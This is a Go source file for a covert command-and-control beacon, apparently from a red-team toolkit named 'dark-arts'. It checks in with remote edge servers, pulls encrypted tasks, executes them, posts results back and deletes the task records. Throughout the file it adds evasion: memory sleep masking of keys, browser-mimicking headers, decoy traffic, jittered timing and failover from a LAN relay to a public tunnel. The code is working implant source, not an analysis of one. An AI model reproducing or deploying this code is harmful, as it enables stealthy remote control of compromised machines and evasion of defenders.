package beacon

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"dark-arts/pkg/crypto"
	"dark-arts/pkg/mimic"
	"dark-arts/pkg/sleepmask"
	"dark-arts/pkg/tasking"
)

type Runner interface {
	Run(ctx context.Context, t *tasking.Task) *tasking.Result
}

type Config struct {
	SeedHex     string
	ServerPub   []byte
	EdgeURL     string
	SID         string
	Sleep       time.Duration
	Jitter      float64
	TaskTimeout time.Duration
	UserAgent   string
	Mimic       bool
	Noise       bool
	SleepMask   bool
	StatePath   string
	Log         *slog.Logger
	Runner      Runner
	HTTP        *http.Client
}

type Beacon struct {
	cfg      Config
	ident    *crypto.Identity
	sess     *crypto.Session
	sid      string
	lastTask uint64
	sleep    time.Duration
	stopped  bool
	log      *slog.Logger
	runner   Runner
	client   *http.Client
	rotator  *mimic.Rotator
	masker   *sleepmask.Masker
	state    string
	edges    []string
	edgeIdx  int
}

func New(cfg Config) (*Beacon, error) {
	if len(cfg.ServerPub) == 0 {
		return nil, errors.New("beacon: server public key required")
	}
	edges := parseEdges(cfg.EdgeURL)
	if len(edges) == 0 {
		return nil, errors.New("beacon: edge url required")
	}
	seed, err := hex.DecodeString(cfg.SeedHex)
	if err != nil || len(seed) != 32 {
		return nil, errors.New("beacon: seed must be 32 bytes hex")
	}
	ident, err := crypto.IdentityFromSeed(seed)
	if err != nil {
		return nil, err
	}
	sid := cfg.SID
	if sid == "" {
		sum := sha256.Sum256(ident.Public())
		sid = hex.EncodeToString(sum[:16])
	}
	sess, err := crypto.NewSession(ident, cfg.ServerPub, sid, crypto.RoleAgent)
	if err != nil {
		return nil, err
	}
	if cfg.Sleep <= 0 {
		cfg.Sleep = 60 * time.Second
	}
	if cfg.TaskTimeout <= 0 {
		cfg.TaskTimeout = 30 * time.Second
	}
	if cfg.StatePath != "" {
		cfg.StatePath = strings.TrimSuffix(cfg.StatePath, ".json") + "-" + sid + ".json"
	}
	if cfg.Log == nil {
		cfg.Log = slog.Default()
	}
	runner := cfg.Runner
	if runner == nil {
		runner = &Executor{Log: cfg.Log, Timeout: cfg.TaskTimeout}
	}
	client := cfg.HTTP
	if client == nil {
		client = &http.Client{Timeout: cfg.TaskTimeout + 5*time.Second}
	}
	b := &Beacon{
		cfg: cfg, ident: ident, sess: sess, sid: sid, sleep: cfg.Sleep,
		log: cfg.Log, runner: runner, client: client, edges: edges,
	}
	if cfg.StatePath != "" {
		b.state = cfg.StatePath
		if raw, err := os.ReadFile(cfg.StatePath); err == nil {
			var st struct {
				SendPos  uint64 `json:"send_pos"`
				LastTask uint64 `json:"last_task"`
			}
			if json.Unmarshal(raw, &st) == nil {
				sess.SkipSend(st.SendPos)
				b.lastTask = st.LastTask
			}
		}
	}
	if cfg.Mimic && cfg.UserAgent == "" {
		b.rotator = mimic.NewRotator("windows-chrome")
	}
	if cfg.SleepMask {
		m, err := sleepmask.New()
		if err != nil {
			return nil, err
		}
		for _, buf := range sess.KeyMaterial() {
			m.Register(buf)
		}
		b.masker = m
	}
	return b, nil
}

func (b *Beacon) SID() string { return b.sid }

func (b *Beacon) Run(ctx context.Context) error {
	release, err := acquireInstanceLock(b.sid)
	if err != nil {
		b.log.Error("instance lock", "err", err)
		return err
	}
	defer release()
	b.log.Info("beacon starting", "sid", b.sid, "sleep", b.sleep.String(), "sleep_mask", b.masker != nil)
	for {
		if b.cfg.Noise && rand.Float64() < 0.3 {
			if err := b.NoiseFetch(ctx); err != nil {
				b.log.Debug("noise fetch failed", "err", err)
			}
		}
		if err := b.CheckIn(ctx); err != nil {
			b.log.Warn("check-in failed", "err", err)
		}
		if b.stopped {
			b.log.Info("beacon terminating on kill directive")
			return nil
		}
		var masked bool
		if b.masker != nil {
			if err := b.masker.Mask(); err != nil {
				b.log.Warn("sleep mask failed", "err", err)
			} else {
				masked = true
				b.log.Debug("sleep mask applied")
			}
		}
		select {
		case <-ctx.Done():
			if masked {
				_ = b.masker.Unmask()
			}
			return nil
		case <-time.After(b.nextDelay()):
			if masked {
				if err := b.masker.Unmask(); err != nil {
					b.log.Warn("sleep unmask failed", "err", err)
				} else {
					b.log.Debug("sleep mask lifted")
				}
			}
		}
	}
}

func (b *Beacon) CheckIn(ctx context.Context) error {
	b.selectEdge(ctx)
	tasks, err := b.pullTasks(ctx)
	if err != nil {
		return err
	}
	for _, raw := range tasks {
		env, err := crypto.UnmarshalEnvelope(raw)
		if err != nil {
			b.log.Warn("malformed task envelope", "err", err)
			continue
		}
		plain, err := b.sess.Decrypt(env)
		if err != nil {
			b.log.Warn("task authentication failed", "err", err)
			continue
		}
		counter := binary.BigEndian.Uint64(env.Nonce[:8])
		if counter+1 > b.lastTask {
			b.lastTask = counter + 1
		}
		var t tasking.Task
		if err := json.Unmarshal(plain, &t); err != nil {
			b.log.Warn("task unmarshal failed", "err", err)
			continue
		}
		b.log.Info("executing task", "id", t.ID, "type", t.Type)
		res := b.runner.Run(ctx, &t)
		if res.SessionID == "" {
			res.SessionID = b.sid
		}
		if err := b.postResult(ctx, res); err != nil {
			b.log.Warn("result post failed", "err", err)
		}
		if err := b.deleteTask(ctx, counter); err != nil {
			b.log.Warn("task blob delete failed", "id", t.ID, "err", err)
		}
		switch t.Type {
		case "kill":
			b.stopped = true
		case "sleep":
			if secs := sleepSecondsFrom(res); secs > 0 {
				b.sleep = time.Duration(secs) * time.Second
				b.log.Info("sleep interval updated", "seconds", secs)
			}
		}
	}
	b.saveState()
	return nil
}

func (b *Beacon) saveState() error {
	if b.state == "" {
		return nil
	}
	st := struct {
		SendPos  uint64 `json:"send_pos"`
		LastTask uint64 `json:"last_task"`
	}{SendPos: b.sess.SendPos(), LastTask: b.lastTask}
	raw, err := json.Marshal(st)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(b.state), 0o755); err != nil {
		return err
	}
	tmp := b.state + ".tmp"
	if err := os.WriteFile(tmp, raw, 0o600); err != nil {
		return err
	}
	return os.Rename(tmp, b.state)
}

func (b *Beacon) pullTasks(ctx context.Context) ([][]byte, error) {
	u := fmt.Sprintf("%s/tasks/%s?f=server&since=%d", b.edgeBase(), url.PathEscape(b.sid), b.lastTask)
	req, err := b.newRequest(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil, err
	}
	resp, err := b.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNotFound {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon: tasks fetch status %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var out []json.RawMessage
	if err := json.Unmarshal(body, &out); err != nil {
		return nil, err
	}
	raws := make([][]byte, 0, len(out))
	for _, r := range out {
		raws = append(raws, []byte(r))
	}
	return raws, nil
}

func (b *Beacon) deleteTask(ctx context.Context, counter uint64) error {
	u := fmt.Sprintf("%s/tasks/%s/%020d?f=server", b.edgeBase(), url.PathEscape(b.sid), counter)
	req, err := b.newRequest(ctx, http.MethodDelete, u, nil)
	if err != nil {
		return err
	}
	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		return fmt.Errorf("beacon: task delete status %d", resp.StatusCode)
	}
	return nil
}

func (b *Beacon) postResult(ctx context.Context, res *tasking.Result) error {
	raw, err := json.Marshal(res)
	if err != nil {
		return err
	}
	env, err := b.sess.Encrypt(raw)
	if err != nil {
		return err
	}
	envBytes, err := env.Marshal()
	if err != nil {
		return err
	}
	u := fmt.Sprintf("%s/ingest?f=beacon", b.edgeBase())
	req, err := b.newRequest(ctx, http.MethodPost, u, bytes.NewReader(envBytes))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusAccepted {
		return fmt.Errorf("beacon: result post status %d", resp.StatusCode)
	}
	return nil
}

func (b *Beacon) newRequest(ctx context.Context, method, u string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequestWithContext(ctx, method, u, body)
	if err != nil {
		return nil, err
	}
	if b.cfg.Mimic {
		if b.rotator != nil {
			if ua := b.rotator.Next(); ua != "" {
				req.Header.Set("User-Agent", ua)
			}
		} else if b.cfg.UserAgent != "" {
			req.Header.Set("User-Agent", b.cfg.UserAgent)
		}
		for k, vv := range mimic.BrowserHeaders() {
			for _, v := range vv {
				req.Header.Add(k, v)
			}
		}
		return req, nil
	}
	if b.cfg.UserAgent != "" {
		req.Header.Set("User-Agent", b.cfg.UserAgent)
	}
	return req, nil
}

func (b *Beacon) NoiseFetch(ctx context.Context) error {
	if !b.cfg.Noise {
		return nil
	}
	u := b.edgeBase() + "/"
	req, err := b.newRequest(ctx, http.MethodGet, u, nil)
	if err != nil {
		return err
	}
	resp, err := b.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

func (b *Beacon) edgeBase() string {
	return b.edges[b.edgeIdx]
}

// parseEdges splits a possibly comma-separated edge list into normalized
// base URLs (trimmed, scheme-prefixed, no trailing slash). Candidates are
// probed in order at every check-in so a beacon can reach the lab over its
// LAN relay and a public tunnel as fallback.
func parseEdges(s string) []string {
	var out []string
	for _, part := range strings.Split(s, ",") {
		u := strings.TrimSpace(part)
		if u == "" {
			continue
		}
		if !strings.Contains(u, "://") {
			u = "http://" + u
		}
		out = append(out, strings.TrimRight(u, "/"))
	}
	return out
}

// selectEdge keeps the current edge when it answers; otherwise it probes the
// remaining candidates in order and switches on the first reachable one.
func (b *Beacon) selectEdge(ctx context.Context) {
	if len(b.edges) < 2 {
		return
	}
	cur := b.edges[b.edgeIdx]
	if b.probeEdge(ctx, cur) {
		return
	}
	for i := range b.edges {
		if i == b.edgeIdx {
			continue
		}
		if b.probeEdge(ctx, b.edges[i]) {
			b.edgeIdx = i
			b.log.Warn("edge switched", "from", cur, "to", b.edges[i])
			return
		}
	}
	b.log.Warn("no edge reachable, keeping", "edge", cur)
}

// probeEdge reports whether the edge is usable: /healthz must answer with a
// 2xx status. A reachable-but-failing endpoint (e.g. the redirector answering
// 502 while the tunnel is down) does not count, so the beacon falls through
// to the next candidate.
func (b *Beacon) probeEdge(ctx context.Context, base string) bool {
	pctx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(pctx, http.MethodGet, base+"/healthz", nil)
	if err != nil {
		return false
	}
	resp, err := b.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode >= 200 && resp.StatusCode < 300
}

func (b *Beacon) nextDelay() time.Duration {
	if b.cfg.Jitter <= 0 {
		return b.sleep
	}
	frac := 1 - b.cfg.Jitter + 2*b.cfg.Jitter*rand.Float64()
	return time.Duration(float64(b.sleep) * frac)
}

func sleepSecondsFrom(res *tasking.Result) int {
	if res.Error != "" {
		return 0
	}
	var v struct {
		Seconds int `json:"seconds"`
	}
	if err := json.Unmarshal(res.Output, &v); err != nil {
		return 0
	}
	return v.Seconds
}
